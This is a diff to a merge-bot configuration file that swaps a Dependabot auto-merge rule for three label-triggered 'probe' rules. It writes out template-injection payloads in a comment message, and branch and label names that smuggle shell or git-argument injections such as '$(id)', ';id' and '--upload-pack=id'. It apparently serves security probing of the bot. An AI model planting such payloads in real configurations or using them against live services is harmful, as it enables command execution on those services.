@@ -1,11 +1,35 @@
 queue_rules:
   - name: default
-    conditions:
+    queue_conditions:
       - base=main
+
 pull_request_rules:
-  - name: auto-merge dependabot
+  - name: probe-comment
     conditions:
-      - author=dependabot[bot]
+      - label=probe-comment
     actions:
-      merge:
-        method: squash
+      comment:
+        message: |
+          C1 arith={{ 7*7 }}
+          C2 ssti={{ cycler.__init__.__globals__ }}
+          C3 shell=$(id)
+          C4 title={{ title }} author={{ author }} number={{ number }} base={{ base }}
+  - name: probe-backport
+    conditions:
+      - label=probe-backport
+    actions:
+      backport:
+        branches:
+          - "--upload-pack=id"
+          - "$(id)"
+          - ";id"
+          - "--exec=id"
+          - "probe-target"
+  - name: probe-label
+    conditions:
+      - label=probe-label
+    actions:
+      label:
+        add:
+          - "L1-$(id)"
+          - "L2-arith"
